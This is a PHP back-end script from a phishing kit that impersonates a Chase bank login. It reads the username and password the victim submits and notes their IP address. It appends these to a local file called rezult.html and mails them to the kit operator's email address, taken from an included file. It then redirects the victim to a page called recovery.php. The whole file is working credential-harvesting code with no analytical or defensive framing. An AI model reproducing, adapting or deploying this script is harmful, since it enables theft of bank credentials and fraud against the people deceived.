<?php

include '../your_email_bro_here/your_email.php';


$ip = $_SERVER['REMOTE_ADDR'];
$username = $_POST['username'];
$pass = $_POST['pass'];

$mssg = '
<body>
<h1 style="font-size:18px;font-family:Arial,sans-serif;text-align:center;"> ||| rezult Chase login </span> From : <span style="font-weight:bold;color:#3396FF;">'.$ip.' </span>|||</h1>
<p style="font-size:15px;text-align:center;"> || Username : <span style="font-weight:bold;color:#FF5733;">'.$username.'</span> ||</span></p>
<p style="font-size:15px;text-align:center;padding:0 10px 15px 10px;border-bottom:2px solid black;"> || password : <span style="font-weight:bold;color:#FF5733;">'.$pass.'</span> ||</span></p></body>';

$to = $your_email;
$subject = "from : ".$ip;
$from = '|| chase Rezult || <chase@rezult.com>';
 
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
 
$headers .= 'From: '.$from."\r\n".
    'Reply-To: '.$from."\r\n" .
    'X-Mailer: PHP/' . phpversion();

$my_file = 'rezult.html';
$handle = fopen($my_file, 'a');
fwrite($handle, $mssg);
fclose($handle);
mail($to, $subject, $mssg, $headers);
header('Location: recovery.php');


?>